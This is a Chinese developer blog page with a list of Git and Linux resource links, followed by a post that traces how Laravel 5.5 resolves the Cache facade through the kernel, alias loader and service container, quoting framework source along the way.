<p><a href="https://learnku.com/articles/33689" target="_blank" rel="noopener">Git 实现 Laravel 项目的自动化部署</a></p>
<p><a href="https://blog.csdn.net/qq_15037231/article/details/77743062" target="_blank" rel="noopener">Linux bash总结</a></p>
<p><a href="https://github.com/GitHubDaily/GitHubDaily" target="_blank" rel="noopener">GitHubDaily 分享内容定期整理与分类</a></p>
<p><a href="https://github.com/billryan/algorithm-exercise" target="_blank" rel="noopener">数据结构与算法/leetcode/lintcode题解</a></p>
<p><a href="https://github.com/dipakkr/A-to-Z-Resources-for-Students" target="_blank" rel="noopener">来自不同开发人员为大学生收集整理的一系列资源</a></p>
<p><a href="https://github.com/24OI/OI-wiki/" target="_blank" rel="noopener">整合了编程竞赛有趣又实用的知识站点</a></p>
<p><a href="https://hackertarget.com/ssh-examples-tunnels" target="_blank" rel="noopener">ssh example</a></p>
<p><a href="https://github.com/xingshaocheng/architect-awesome/blob/master/README.md" target="_blank" rel="noopener">《后端架构师技术图谱》</a></p>
<p><a href="https://laravel-china.org/articles/22068?#reply77626" target="_blank" rel="noopener">Git 的奇技淫巧</a></p>
<p><a href="https://laravel-china.org/articles/22107?#reply77627" target="_blank" rel="noopener">Linux 笔记分享二十（终章）：网络命令</a></p>
<p><a href="https://coffeephp.com/articles/3" target="_blank" rel="noopener">搭建Git服务器 </a></p>
<p><a href="https://www.goozp.com/article/83.html" target="_blank" rel="noopener">入门 Linux 之 从命令行开始</a></p>
<p><a href="https://www.fanhaobai.com/2016/05/recover-file.html" target="_blank" rel="noopener">Linux下恢复误删除的文件</a></p>
<p><a href="https://www.goozp.com/article/86.html" target="_blank" rel="noopener">Linux 下工作必须会的命令清单</a></p>
<p><a href="https://juejin.im/post/5c22056551882518fc5fe294?utm_source=gold_browser_extension#heading-40" target="_blank" rel="noopener">中日合拍的《Git游记》即将正式开机</a></p>
<p><a href="https://github.com/pomber/git-history" target="_blank" rel="noopener">查看 Git 文件变动历史</a></p>
<p><a href="https://segmentfault.com/a/1190000016732183" target="_blank" rel="noopener">Git的奇技淫巧</a></p>
<p><a href="https://michael728.github.io/2018/09/08/tools-gitbook-hackpythonista-notebook/" target="_blank" rel="noopener">使用GitBook+Github编写文档书籍</a></p>
<p><a href="https://backlog.com/git-tutorial/cn/" target="_blank" rel="noopener">猴子都能懂得git</a></p>
<p><a href="https://gleehub.com/program/git-commit-emoji-shi-yong-zhi-nan.html" target="_blank" rel="noopener">Git commit emoji </a></p>
<p><a href="https://skyao.io/learning-git/" target="_blank" rel="noopener">git 学习笔记</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/08/laravel-cache-facade/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/08/laravel-cache-facade/" itemprop="url">laravel cache facade</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-08T14:03:46+08:00">
                2019-01-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  7 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文使用版本为laravel5.5</p>
<h3 id="cache-get"><a href="#cache-get" class="headerlink" title="cache get"></a>cache get</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">cache</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	$c=\Cache::get(<span class="string">'app'</span>);</span><br><span class="line">    	<span class="keyword">if</span>(!$c) &#123;</span><br><span class="line">    		\Cache::put(<span class="string">'app'</span>, <span class="string">'cache'</span>, <span class="number">1</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	dump($c);<span class="comment">//cache</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="config-app-php"><a href="#config-app-php" class="headerlink" title="config/app.php"></a>config/app.php</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'aliases'</span> =&gt; [</span><br><span class="line"></span><br><span class="line">       <span class="string">'App'</span> =&gt; Illuminate\Support\Facades\App::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">       '<span class="title">Artisan</span>' </span>=&gt; Illuminate\Support\Facades\Artisan::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">       '<span class="title">Auth</span>' </span>=&gt; Illuminate\Support\Facades\Auth::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">       '<span class="title">Blade</span>' </span>=&gt; Illuminate\Support\Facades\Blade::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">       '<span class="title">Broadcast</span>' </span>=&gt; Illuminate\Support\Facades\Broadcast::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">       '<span class="title">Bus</span>' </span>=&gt; Illuminate\Support\Facades\Bus::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">       '<span class="title">Cache</span>' </span>=&gt; Illuminate\Support\Facades\Cache::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">       </span></span><br><span class="line">       ]</span><br></pre></td></tr></table></figure>
<p>使用cache实际调用的是<code>Illuminate\Support\Facades\Cache</code>,这个映射是如何做的？</p>
<h3 id="public-index-php"><a href="#public-index-php" class="headerlink" title="public/index.php"></a>public/index.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">$request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="bootstarp-app-php"><a href="#bootstarp-app-php" class="headerlink" title="bootstarp/app.php"></a>bootstarp/app.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Http\Kernel::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">    App\Http\Kernel::class</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="app-http-kernel-php"><a href="#app-http-kernel-php" class="headerlink" title="app/http/kernel.php"></a>app/http/kernel.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use Illuminate\Foundation\Http\Kernel <span class="keyword">as</span> HttpKernel;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kernel</span> <span class="keyword">extends</span> <span class="title">HttpKernel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Illuminate-Foundation-Http-Kernel-php"><a href="#Illuminate-Foundation-Http-Kernel-php" class="headerlink" title="Illuminate/Foundation/Http/Kernel.php"></a>Illuminate/Foundation/Http/Kernel.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $request-&gt;enableHttpMethodParameterOverride();</span><br><span class="line">        $response = $<span class="keyword">this</span>-&gt;sendRequestThroughRouter($request);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;reportException($e);</span><br><span class="line"></span><br><span class="line">        $response = $<span class="keyword">this</span>-&gt;renderException($request, $e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;reportException($e = <span class="keyword">new</span> FatalThrowableError($e));</span><br><span class="line"></span><br><span class="line">        $response = $<span class="keyword">this</span>-&gt;renderException($request, $e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $<span class="keyword">this</span>-&gt;app[<span class="string">'events'</span>]-&gt;dispatch(</span><br><span class="line">        <span class="keyword">new</span> Events\RequestHandled($request, $response)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br><span class="line">protected <span class="function"><span class="keyword">function</span> <span class="title">sendRequestThroughRouter</span>(<span class="params">$request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">        Facade::clearResolvedInstance(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;bootstrap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline($<span class="keyword">this</span>-&gt;app))</span><br><span class="line">                    -&gt;send($request)</span><br><span class="line">                    -&gt;through($<span class="keyword">this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : $<span class="keyword">this</span>-&gt;middleware)</span><br><span class="line">                    -&gt;then($<span class="keyword">this</span>-&gt;dispatchToRouter());</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! $<span class="keyword">this</span>-&gt;app-&gt;hasBeenBootstrapped()) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;app-&gt;bootstrapWith($<span class="keyword">this</span>-&gt;bootstrappers());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Illuminate-Foundation-Application-php"><a href="#Illuminate-Foundation-Application-php" class="headerlink" title="Illuminate/Foundation/Application.php"></a>Illuminate/Foundation/Application.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">bootstrapWith</span>(<span class="params">array $bootstrappers</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;hasBeenBootstrapped = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        foreach ($bootstrappers <span class="keyword">as</span> $bootstrapper) &#123;</span><br><span class="line">            $<span class="keyword">this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapping: '</span>.$bootstrapper, [$<span class="keyword">this</span>]);</span><br><span class="line"></span><br><span class="line">            $<span class="keyword">this</span>-&gt;make($bootstrapper)-&gt;bootstrap($<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">            $<span class="keyword">this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapped: '</span>.$bootstrapper, [$<span class="keyword">this</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Illuminate-Foundation-Bootstrap-RegisterFacades-php"><a href="#Illuminate-Foundation-Bootstrap-RegisterFacades-php" class="headerlink" title="Illuminate/Foundation/Bootstrap/RegisterFacades.php"></a>Illuminate/Foundation/Bootstrap/RegisterFacades.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params">Application $app</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Facade::clearResolvedInstances();</span><br><span class="line"></span><br><span class="line">        Facade::setFacadeApplication($app);</span><br><span class="line"><span class="comment">//将config/app.php 里的aliases数组里面的Facades类设置别名</span></span><br><span class="line">        AliasLoader::getInstance(array_merge(</span><br><span class="line">            $app-&gt;make(<span class="string">'config'</span>)-&gt;get(<span class="string">'app.aliases'</span>, []),</span><br><span class="line">            $app-&gt;make(PackageManifest::<span class="class"><span class="keyword">class</span>)-&gt;<span class="title">aliases</span>()</span></span><br><span class="line"><span class="class">        ))-&gt;<span class="title">register</span>()</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Illuminate-Foundation-AliasLoader-php"><a href="#Illuminate-Foundation-AliasLoader-php" class="headerlink" title="Illuminate/Foundation/AliasLoader.php"></a>Illuminate/Foundation/AliasLoader.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params">$alias</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">static</span>::$facadeNamespace &amp;&amp; strpos($alias, <span class="attr">static</span>::$facadeNamespace) === <span class="number">0</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;loadFacade($alias);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// $alias来自于config/app.php中aliases数组 </span></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;aliases[$alias])) &#123;</span><br><span class="line">            <span class="comment">//'Route' =&gt; Illuminate\Support\Facades\Route::class,</span></span><br><span class="line">            <span class="comment">// class_alias 为一个类创建别名</span></span><br><span class="line">            <span class="keyword">return</span> class_alias($<span class="keyword">this</span>-&gt;aliases[$alias], $alias);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Illuminate-Support-Facades-Cache-php"><a href="#Illuminate-Support-Facades-Cache-php" class="headerlink" title="Illuminate/Support/Facades/Cache.php"></a>Illuminate/Support/Facades/Cache.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> <span class="keyword">extends</span> <span class="title">Facade</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the registered name of the component.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeAccessor</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'cache'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Illuminate-Support-Facades-Facade-php"><a href="#Illuminate-Support-Facades-Facade-php" class="headerlink" title="Illuminate/Support/Facades/Facade.php"></a>Illuminate/Support/Facades/Facade.php</h3><p>这个文件没有get set ，只有__callStatic<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125;</span><br><span class="line">   public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125; </span><br><span class="line">     protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">//这里$name为cache</span></span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$resolvedInstance[$name])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//$app是容器对象，实现了ArrayAccess接口，最终调用的还是容器的make方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name] = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Illuminate-Container-Container-php"><a href="#Illuminate-Container-Container-php" class="headerlink" title="Illuminate\Container\Container.php"></a>Illuminate\Container\Container.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$abstract, array $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">resolve</span>(<span class="params">$abstract, $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = $<span class="keyword">this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">        $needsContextualBuild = ! empty($parameters) || ! is_null(</span><br><span class="line">            $<span class="keyword">this</span>-&gt;getContextualConcrete($abstract)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If an instance of the type is currently being managed as a singleton we'll</span></span><br><span class="line">        <span class="comment">// just return an existing instance instead of instantiating new instances</span></span><br><span class="line">        <span class="comment">// so the developer can keep using the same objects instance every time.</span></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;instances[$abstract];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="keyword">with</span>[] = $parameters;</span><br><span class="line"></span><br><span class="line">        $concrete = $<span class="keyword">this</span>-&gt;getConcrete($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// We're ready to instantiate an instance of the concrete type registered for</span></span><br><span class="line">        <span class="comment">// the binding. This will instantiate the types, as well as resolve any of</span></span><br><span class="line">        <span class="comment">// its "nested" dependencies recursively until all have gotten resolved.</span></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;build($concrete);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;make($concrete);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If we defined any extenders for this type, we'll need to spin through them</span></span><br><span class="line">        <span class="comment">// and apply them to the object being built. This allows for the extension</span></span><br><span class="line">        <span class="comment">// of services, such as changing configuration or decorating the object.</span></span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">            $object = $extender($object, $<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the requested type is registered as a singleton we'll want to cache off</span></span><br><span class="line">        <span class="comment">// the instances in "memory" so we can return it later without creating an</span></span><br><span class="line">        <span class="comment">// entirely new instance of an object on each subsequent request for it.</span></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Before returning, we will also set the resolved flag to "true" and pop off</span></span><br><span class="line">        <span class="comment">// the parameter overrides for this build. After those two things are done</span></span><br><span class="line">        <span class="comment">// we will be ready to return back the fully constructed class instance.</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;resolved[$abstract] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        array_pop($<span class="keyword">this</span>-&gt;<span class="keyword">with</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Illuminate-Cache-CacheServiceProvider-php"><a href="#Illuminate-Cache-CacheServiceProvider-php" class="headerlink" title="Illuminate/Cache/CacheServiceProvider.php"></a>Illuminate/Cache/CacheServiceProvider.php</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $<span class="keyword">this</span>-&gt;app-&gt;singleton(<span class="string">'cache'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$app</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> CacheManager($app);</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;app-&gt;singleton(<span class="string">'cache.store'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$app</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> $app[<span class="string">'cache'</span>]-&gt;driver();</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;app-&gt;singleton(<span class="string">'memcached.connector'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> MemcachedConnector;</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h3 id="get-set"><a href="#get-set" class="headerlink" title="get set"></a>get set</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$instance-&gt;$method(...$args)</span><br><span class="line"></span><br><span class="line">由于 PHP 可以处理 WEB 和 CLI 两种接口请求，所以 Laravel 就得需要设计 HttpKernel 和 ConsoleKernel 来处理这两种。</span><br><span class="line">实际上，Laravel 刚刚启动时先启动容器对象 Application，然后加载配置、通过 ServiceProvider 往容器对象里填充一些对象为接下来处理请求做准备，但是真正干活的是 Kernel(HttpKernel 或 ConsoleKernel)，Application 会把活转给 Kernel 来干。$output = Kernel::handle($input)：对于 WEB 请求，输入时 Request，输出是 Response；对于 CLI，输入是 argument + option 命令行变量构成的 Input 对象，输出则是展示在终端的 Output 对象。</span><br><span class="line">所以，依赖注入(IoC 容器) 是 Laravel 的基石，真正干活的是 Kernel。https:<span class="comment">//laravel-china.org/articles/20507</span></span><br></pre></td></tr></table></figure>
